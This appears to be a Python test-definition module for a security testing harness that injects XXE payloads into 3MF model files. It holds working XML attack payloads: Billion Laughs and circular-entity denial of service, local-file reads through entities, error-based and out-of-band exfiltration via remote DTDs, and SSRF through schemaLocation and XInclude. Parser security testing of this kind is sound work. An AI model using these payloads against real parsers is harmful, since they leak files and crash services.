"""Defines information to create the XML testcases."""

# pylint: disable=wildcard-import,unused-wildcard-import

from os.path import join
from typing import Callable

from ... import LOCAL_SERVER, STATIC_FILE_DIR_DST
from ..tmf_model_mutator.base import ComplexType, SimpleType
from ..tmf_model_mutator.complex_types import *
from ..tmf_model_mutator.simple_types import *


def __modify_first_element(
    root: ComplexType, callback: Callable[[ComplexType], ComplexType]
) -> ComplexType:
    """Iterates over all elements (depth first) and calls the given function on them.
    The first time the function is used break the execution."""

    res = callback(root)
    if res is not None:
        return res

    def recurse(element):
        for index, child in enumerate(element.children):
            new_child = callback(child)
            if new_child is not None:
                element.children[index] = new_child
                break
            element.children[index] = recurse(child)
        return element

    return recurse(root)


def _add_attributes(
    target_tag: str, attributes: list[tuple[str, SimpleType]]
) -> Callable[[ComplexType], ComplexType]:
    """Returned function adds the given attributes to the first (child)-object of target_type."""

    def _add_attributes_inner(element: ComplexType):
        def callback(element):
            if element.tag == target_tag:
                element.attributes += attributes
                return element

        return __modify_first_element(element, callback)

    return _add_attributes_inner


def _delete_attributes(
    target_tag: str, attribute_names: list[str]
) -> Callable[[ComplexType], ComplexType]:
    """Returned function deletes the given attributes from the first (child)-object of
    target_type."""

    def _delete_attributes_inner(element: ComplexType):
        def callback(element):
            if element.tag == target_tag:
                element.attributes = [
                    (name, value)
                    for name, value in element.attributes
                    if name not in attribute_names
                ]
                return element

        return __modify_first_element(element, callback)

    return _delete_attributes_inner


def _add_children(
    target_tag: str, children: list[tuple[str, SimpleType]]
) -> Callable[[ComplexType], ComplexType]:
    """Returned function adds the given children to the first (child)-object of target_type."""

    def _add_children_inner(element: ComplexType):
        def callback(element):
            if element.tag == target_tag:
                element.children += children
                return element

        return __modify_first_element(element, callback)

    return _add_children_inner


def _delete_children(
    target_tag: str, children_target_types: list[ComplexType]
) -> Callable[[ComplexType], ComplexType]:
    """Returned function removes the given children_target_types from the first (child)-object
    of target_type."""

    def _delete_children_inner(element: ComplexType):
        def callback(element):
            if element.tag == target_tag:
                element.children = [
                    child
                    for child in element.children
                    if not isinstance(child, tuple(children_target_types))
                ]
                return element

        return __modify_first_element(element, callback)

    return _delete_children_inner


def _set_tag(target_tag: str, tag: str) -> Callable[[ComplexType], ComplexType]:
    """Returned function sets the given tag to the first (child)-object of target_type."""

    def _set_tag_inner(element: ComplexType):
        def callback(element):
            if element.tag == target_tag:
                element.tag = tag
                return element

        return __modify_first_element(element, callback)

    return _set_tag_inner


def _set_value(target_tag: str, value) -> Callable[[ComplexType], ComplexType]:
    """Returned function sets the value of the first element with tag=target_tag
    it finds among the children."""

    def _set_metadata_value_inner(element: ComplexType):
        def callback(element):
            if element.tag == target_tag:
                element.value = value
                return element

        return __modify_first_element(element, callback)

    return _set_metadata_value_inner


TESTCASES = [
    {
        "id": "B-IGE",
        "prefixed_code": """\
            <!DOCTYPE {ROOT} [
                {DTD}

                <!ENTITY a0 "successful!" >
            ]>
            """,
        "postfixed_code": "",
        "model_manipulation": [_set_value(CT_Metadata().tag, "&a0;")],
        "model_alt_manipulation": [_set_value(CT_Mesh().tag, "&a0;")],
        "rels_manipulation": [_set_value("Relationship", "&a0;")],
        "type": "Functionality",
        "name": "Internal General Entity",
    },
    {
        "id": "B-IPE",
        "prefixed_code": """\
            <!DOCTYPE {ROOT} [
                {DTD}

                <!ENTITY % outer "<!ENTITY a0 'successful!'>">
                %outer;
            ]>
            """,
        "postfixed_code": "",
        "model_manipulation": [_set_value(CT_Metadata().tag, "&a0;")],
        "model_alt_manipulation": [_set_value(CT_Mesh().tag, "&a0;")],
        "rels_manipulation": [_set_value("Relationship", "&a0;")],
        "type": "Functionality",
        "name": "Internal Parameter Entity",
    },
    {
        "id": "B-EGE-L",
        "prefixed_code": f"""\
            <!DOCTYPE {{ROOT}} [
                {{DTD}}

                <!ENTITY a0 SYSTEM "file://{join(STATIC_FILE_DIR_DST, "test.txt")}">
            ]>
            """,
        "postfixed_code": "",
        "model_manipulation": [_set_value(CT_Metadata().tag, "&a0;")],
        "model_alt_manipulation": [_set_value(CT_Mesh().tag, "&a0;")],
        "rels_manipulation": [_set_value("Relationship", "&a0;")],
        "type": "Functionality",
        "name": "External General Entity (local)",
    },
    {
        "id": "B-EGE-R",
        "prefixed_code": f"""\
            <!DOCTYPE {{ROOT}} [
                {{DTD}}

                <!ENTITY a0 SYSTEM "{LOCAL_SERVER}/test.txt">
            ]>
            """,
        "postfixed_code": "",
        "model_manipulation": [_set_value(CT_Metadata().tag, "&a0;")],
        "model_alt_manipulation": [_set_value(CT_Mesh().tag, "&a0;")],
        "rels_manipulation": [_set_value("Relationship", "&a0;")],
        "type": "Functionality",
        "name": "External General Entity (remote)",
    },
    {
        "id": "B-EGE-LX",
        "prefixed_code": f"""\
            <!DOCTYPE {{ROOT}} [
                {{DTD}}

                <!ENTITY obj SYSTEM "file://{join(STATIC_FILE_DIR_DST, "3mf-object.xml")}">
            ]>
            """,
        "postfixed_code": "",
        "model_manipulation": [
            _delete_children(CT_Resources().tag, [CT_Object]),
            _set_value(CT_Resources().tag, "&obj;"),
        ],
        "type": "Functionality",
        "name": "External General Entity (local, XML content)",
    },
    {
        "id": "B-EGE-RX",
        "prefixed_code": f"""\
            <!DOCTYPE {{ROOT}} [
                {{DTD}}

                <!ENTITY obj SYSTEM "{LOCAL_SERVER}/3mf-object.xml">
            ]>
            """,
        "postfixed_code": "",
        "model_manipulation": [
            _delete_children(CT_Resources().tag, [CT_Object]),
            _set_value(CT_Resources().tag, "&obj;"),
        ],
        "type": "Functionality",
        "name": "External General Entity (remote, XML content)",
    },
    {
        "id": "B-EPE-L",
        "prefixed_code": f"""\
            <!DOCTYPE {{ROOT}} [
                {{DTD}}

                <!ENTITY % dtd SYSTEM "file://{join(STATIC_FILE_DIR_DST, "test.dtd")}">
                %dtd;
            ]>
            """,
        "postfixed_code": "",
        "model_manipulation": [_set_value(CT_Metadata().tag, "&a0;")],
        "model_alt_manipulation": [_set_value(CT_Mesh().tag, "&a0;")],
        "rels_manipulation": [_set_value("Relationship", "&a0;")],
        "type": "Functionality",
        "name": "External Parameter Entity (local)",
    },
    {
        "id": "B-EPE-R",
        "prefixed_code": f"""\
            <!DOCTYPE {{ROOT}} [
                {{DTD}}

                <!ENTITY % dtd SYSTEM "{LOCAL_SERVER}/test.dtd" >
                %dtd;
            ]>
            """,
        "postfixed_code": "",
        "model_manipulation": [_set_value(CT_Metadata().tag, "&a0;")],
        "model_alt_manipulation": [_set_value(CT_Mesh().tag, "&a0;")],
        "rels_manipulation": [_set_value("Relationship", "&a0;")],
        "type": "Functionality",
        "name": "External Parameter Entity (remote)",
    },
    {
        "id": "DOS-BL",
        "prefixed_code": """\
            <!DOCTYPE {ROOT} [
                {DTD}

                <!ENTITY lol0 "lollollollollollollollollollol">
                <!ENTITY lol1 "&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;&lol0;">
                <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
                <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
                <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
                <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
                <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
                <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
                <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
                <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">

                <!ENTITY lol "&lol9;">
            ]>
            """,
        "postfixed_code": "",
        "model_manipulation": [_set_value(CT_Metadata().tag, "&lol;")],
        "model_alt_manipulation": [_set_value(CT_Mesh().tag, "&lol;")],
        "rels_manipulation": [_set_value("Relationship", "&lol;")],
        "type": "Denial of Service",
        "name": "Billion Laughs",
    },
    {
        "id": "DOS-BL-PE-R",
        "prefixed_code": f"""\
            <!DOCTYPE {{ROOT}} SYSTEM "{LOCAL_SERVER}/dos.dtd" [
                {{DTD}}
            ]>
            """,
        "postfixed_code": "",
        "model_manipulation": [_set_value(CT_Metadata().tag, "&g;")],
        "model_alt_manipulation": [_set_value(CT_Mesh().tag, "&g;")],
        "rels_manipulation": [_set_value("Relationship", "&g;")],
        "type": "Denial of Service",
        "name": "Billion Laughs Parameter Entity (remote)",
    },
    {
        "id": "DOS-C",
        "prefixed_code": """\
            <!DOCTYPE {ROOT} [
                {DTD}

                <!ENTITY a "a&b;" >
                <!ENTITY b "&a;" >
            ]>
            """,
        "postfixed_code": "",
        "model_manipulation": [_set_value(CT_Metadata().tag, "&a;")],
        "model_alt_manipulation": [_set_value(CT_Mesh().tag, "&a;")],
        "rels_manipulation": [_set_value("Relationship", "&a;")],
        "type": "Denial of Service",
        "name": "Circular Reference",
    },
    {
        "id": "DOS-PL",
        "prefixed_code": """\
            <!DOCTYPE {ROOT} [
                {DTD}

                <!ENTITY % pe_1 "<!---->">
                <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
                <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
                <!ENTITY % pe_3 "&#37;pe_3;<!---->&#37;pe_3;">
                <!ENTITY % pe_3 "&#37;pe_4;<!---->&#37;pe_4;">
                <!ENTITY % pe_3 "&#37;pe_5;<!---->&#37;pe_5;">
                <!ENTITY % pe_3 "&#37;pe_6;<!---->&#37;pe_6;">
                <!ENTITY % pe_3 "&#37;pe_7;<!---->&#37;pe_7;">
                <!ENTITY % pe_3 "&#37;pe_8;<!---->&#37;pe_8;">
                <!ENTITY % pe_3 "&#37;pe_9;<!---->&#37;pe_9;">
            ]>
            """,
        "postfixed_code": "",
        "model_manipulation": [],
        "rels_manipulation": [],
        "type": "Denial of Service",
        "name": "Parameter Laughs",
        "description": (
            "variant of Billion Laughs Attack using delayed interpretation of parameter entities "
            "Copyright (C) Sebastian Pipping <sebastian@pipping.org>"
        ),
    },
    {
        "id": "FBC-BPR-A",
        "prefixed_code": f"""\
            <!DOCTYPE {{ROOT}} [
                {{DTD}}

                <!ENTITY % start "<![CDATA[">
                <!ENTITY % goodies SYSTEM "file://{join(STATIC_FILE_DIR_DST, "test.txt")}">
                <!ENTITY % end "]]>">
                <!ENTITY % dtd SYSTEM "{LOCAL_SERVER}/parameterEntity_core.dtd">
            %dtd;
            ]>
        """,
        "postfixed_code": "",
        "model_manipulation": [_set_value(CT_Metadata().tag, "&all;")],
        "model_alt_manipulation": [_set_value(CT_Mesh().tag, "&all;")],
        "rels_manipulation": [_set_value("Relationship", "&all;")],
        "type": "Data Exfiltration, In-Band",
        "name": "ByPass Restrictions Variant A",
    },
    {
        "id": "FBC-BPR-B",
        "prefixed_code": f"""\
            <!DOCTYPE {{ROOT}} SYSTEM "{LOCAL_SERVER}/parameterEntity_doctype.dtd">
        """,
        "postfixed_code": "",
        "model_manipulation": [_set_value(CT_Metadata().tag, "&all;")],
        "model_alt_manipulation": [_set_value(CT_Mesh().tag, "&all;")],
        "rels_manipulation": [_set_value("Relationship", "&all;")],
        "type": "Data Exfiltration, In-Band",
        "name": "ByPass Restrictions Variant B",
    },
    {
        "id": "FBC-AV",
        "prefixed_code": f"""\
            <!DOCTYPE {{ROOT}} [
                {{DTD}}

                <!ENTITY % remote SYSTEM "{LOCAL_SERVER}/external_entity_attribute.dtd">
                %remote;
            ]>
        """,
        "postfixed_code": "",
        "model_manipulation": [
            _add_attributes(CT_Object().tag, [("name", XS_String("&internal;"))])
        ],
        "rels_manipulation": [
            _delete_attributes("Relationship", ["id"]),
            _add_attributes("Relationship", [("id", XS_String("&internal;"))]),
        ],
        "type": "Data Exfiltration, In-Band",
        "name": "Attribute Values",
    },
    {
        "id": "FBC-E",
        "prefixed_code": f"""\
            <!DOCTYPE {{ROOT}} [
                {{DTD}}

                <!ENTITY % ext SYSTEM "{LOCAL_SERVER}/error-based.dtd">
                %ext;
            ]>
        """,
        "postfixed_code": "",
        "model_manipulation": [],
        "rels_manipulation": [],
        "type": "Data Exfiltration, In-Band",
        "name": "Error Based",
    },
    {
        "id": "FBC-E-L",
        "prefixed_code": f"""\
            <!DOCTYPE {{ROOT}} [
                {{DTD}}

                <!ENTITY % local_dtd SYSTEM "file://{join(STATIC_FILE_DIR_DST, "error-based-local.dtd")}">

                <!ENTITY % condition 'aaa)>
                    <!ENTITY &#x25; file SYSTEM "file://{join(STATIC_FILE_DIR_DST, "test.txt")}>
                    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
                    &#x25;eval;
                    &#x25;error;
                    <!ELEMENT aa (bb'>

                %local_dtd;
            ]>
        """,
        "postfixed_code": "",
        "model_manipulation": [],
        "rels_manipulation": [],
        "type": "Data Exfiltration, In-Band",
        "name": "Error Based (local)",
    },
    {
        "id": "OOB-R",
        "prefixed_code": f"""\
            <!DOCTYPE {{ROOT}} SYSTEM "{LOCAL_SERVER}/parameterEntity_oob.dtd">
        """,
        "postfixed_code": "",
        "model_manipulation": [_set_value(CT_Metadata().tag, "&send;")],
        "model_alt_manipulation": [_set_value(CT_Mesh().tag, "&send;")],
        "rels_manipulation": [_set_value("Relationship", "&send;")],
        "type": "Data Exfiltration, Out-Of-Band",
        "name": "General (remote)",
    },
    {
        "id": "OOB-PE-R",
        "prefixed_code": f"""\
            <!DOCTYPE {{ROOT}} [
                {{DTD}}

                <!ENTITY % remote SYSTEM "{LOCAL_SERVER}/parameterEntity_sendhttp.dtd">
                %remote;
                %send;
            ]>
        """,
        "postfixed_code": "",
        "model_manipulation": [],
        "rels_manipulation": [],
        "type": "Data Exfiltration, Out-Of-Band",
        "name": "Parameter Entity (remote)",
    },
    {
        "id": "OOB-SL",
        "prefixed_code": f"""\
            <!DOCTYPE {{ROOT}} [
                {{DTD}}

                <!ENTITY % remote SYSTEM "{LOCAL_SERVER}/external_entity_attribute.dtd">
                %remote;
            ]>
        """,
        "postfixed_code": "",
        "model_manipulation": [
            _set_tag(CT_Model().tag, "ttt:model"),
            _add_attributes(
                CT_Model().tag,
                [
                    ("xmlns:xsi", XS_String("http://www.w3.org/2001/XMLSchema-instance")),
                    ("xmlns:ttt", XS_String("http://test.com/attack")),
                    ("xsi:schemaLocation", XS_String(f"ttt {LOCAL_SERVER}/&internal;")),
                ],
            ),
        ],
        "rels_manipulation": [
            _set_tag("Relationships", "ttt:Relationships"),
            _add_attributes(
                "Relationships",
                [
                    ("xmlns:xsi", XS_String("http://www.w3.org/2001/XMLSchema-instance")),
                    ("xmlns:ttt", XS_String("http://test.com/attack")),
                    ("xsi:schemaLocation", XS_String(f"ttt {LOCAL_SERVER}/&internal;")),
                ],
            ),
        ],
        "type": "Data Exfiltration, Out-Of-Band",
        "name": "SchemaLocation (remote)",
    },
    {
        "id": "OOB-NNSL",
        "prefixed_code": f"""\
            <!DOCTYPE {{ROOT}} [
                {{DTD}}

                <!ENTITY % remote SYSTEM "{LOCAL_SERVER}/external_entity_attribute.dtd">
                %remote;
            ]>
        """,
        "postfixed_code": "",
        "model_manipulation": [
            _delete_attributes(CT_Model().tag, ["xmlns"]),
            _add_attributes(
                CT_Model().tag,
                [
                    ("xmlns:xsi", XS_String("http://www.w3.org/2001/XMLSchema-instance")),
                    ("xsi:noNamespaceSchemaLocation", XS_String(f"{LOCAL_SERVER}/&internal;")),
                ],
            ),
        ],
        "rels_manipulation": [
            _delete_attributes("Relationships", ["xmlns"]),
            _add_attributes(
                "Relationships",
                [
                    ("xmlns:xsi", XS_String("http://www.w3.org/2001/XMLSchema-instance")),
                    ("xsi:noNamespaceSchemaLocation", XS_String(f"{LOCAL_SERVER}/&internal;")),
                ],
            ),
        ],
        "type": "Data Exfiltration, Out-Of-Band",
        "name": "NoNamespaceSchemaLocation (remote)",
    },
    {
        "id": "OOB-XI",
        "prefixed_code": f"""\
            <!DOCTYPE {{ROOT}} [
                {{DTD}}

                <!ENTITY % remote SYSTEM "{LOCAL_SERVER}/external_entity_attribute.dtd">
                %remote;
            ]>
        """,
        "postfixed_code": "",
        "model_manipulation": [
            _add_attributes(
                CT_Model().tag,
                [("xmlns:xi", XS_String("http://www.w3.org/2001/XInclude"))],
            ),
            _add_children(
                CT_Model().tag,
                [
                    CT_ANY(
                        "xi:include",
                        attributes=[
                            ("href", XS_String(f"{LOCAL_SERVER}/&internal;")),
                            ("parse", XS_String("text")),
                        ],
                        value="",
                    )
                ],
            ),
        ],
        "rels_manipulation": [
            _add_attributes(
                "Relationships",
                [("xmlns:xi", XS_String("http://www.w3.org/2001/XInclude"))],
            ),
            _add_children(
                "Relationships",
                [
                    CT_ANY(
                        "xi:include",
                        attributes=[
                            ("href", XS_String(f"{LOCAL_SERVER}/&internal;")),
                            ("parse", XS_String("text")),
                        ],
                        value="",
                    )
                ],
            ),
        ],
        "type": "Data Exfiltration, Out-Of-Band",
        "name": "XInclude (remote)",
    },
    {
        "id": "SSRF-SL",
        "prefixed_code": "",
        "postfixed_code": "",
        "model_manipulation": [
            _set_tag(CT_Model().tag, "ttt:model"),
            _add_attributes(
                CT_Model().tag,
                [
                    ("xmlns:xsi", XS_String("http://www.w3.org/2001/XMLSchema-instance")),
                    ("xmlns:ttt", XS_String("http://test.com/attack")),
                    ("xsi:schemaLocation", XS_String(f"ttt {LOCAL_SERVER}/3mf-core.xsd")),
                ],
            ),
        ],
        "rels_manipulation": [
            _set_tag("Relationships", "ttt:Relationships"),
            _add_attributes(
                "Relationships",
                [
                    ("xmlns:xsi", XS_String("http://www.w3.org/2001/XMLSchema-instance")),
                    ("xmlns:ttt", XS_String("http://test.com/attack")),
                    ("xsi:schemaLocation", XS_String(f"ttt {LOCAL_SERVER}/3mf-core.xsd")),
                ],
            ),
        ],
        "type": "Functionality",
        "name": "SchemaLocation (remote)",
    },
    {
        "id": "SSRF-NNSL",
        "prefixed_code": "",
        "postfixed_code": "",
        "model_manipulation": [
            _delete_attributes(CT_Model().tag, ["xmlns"]),
            _add_attributes(
                CT_Model().tag,
                [
                    ("xmlns:xsi", XS_String("http://www.w3.org/2001/XMLSchema-instance")),
                    ("xsi:noNamespaceSchemaLocation", XS_String(f"{LOCAL_SERVER}/3mf-core.xsd")),
                ],
            ),
        ],
        "rels_manipulation": [
            _delete_attributes("Relationships", ["xmlns"]),
            _add_attributes(
                "Relationships",
                [
                    ("xmlns:xsi", XS_String("http://www.w3.org/2001/XMLSchema-instance")),
                    ("xsi:noNamespaceSchemaLocation", XS_String(f"{LOCAL_SERVER}/3mf-core.xsd")),
                ],
            ),
        ],
        "type": "Functionality",
        "name": "NoNamespaceSchemaLocation (remote)",
    },
    {
        "id": "SSRF-XI",
        "prefixed_code": "",
        "postfixed_code": "",
        "model_manipulation": [
            _add_attributes(
                CT_Model().tag,
                [("xmlns:xi", XS_String("http://www.w3.org/2001/XInclude"))],
            ),
            _delete_children(CT_Model().tag, [CT_Build]),
            _add_children(
                CT_Model().tag,
                [
                    CT_ANY(
                        "xi:include",
                        attributes=[
                            ("href", XS_String(f"{LOCAL_SERVER}/build-element.xml")),
                            ("parse", XS_String("text")),
                        ],
                        value="",
                    )
                ],
            ),
        ],
        "rels_manipulation": [
            _add_attributes(
                "Relationships",
                [("xmlns:xi", XS_String("http://www.w3.org/2001/XInclude"))],
            ),
            _add_children(
                "Relationships",
                [
                    CT_ANY(
                        "xi:include",
                        attributes=[
                            ("href", XS_String(f"{LOCAL_SERVER}/build-element.xml")),
                            ("parse", XS_String("text")),
                        ],
                        value="",
                    )
                ],
            ),
        ],
        "type": "Functionality",
        "name": "XInclude (remote)",
    },
]
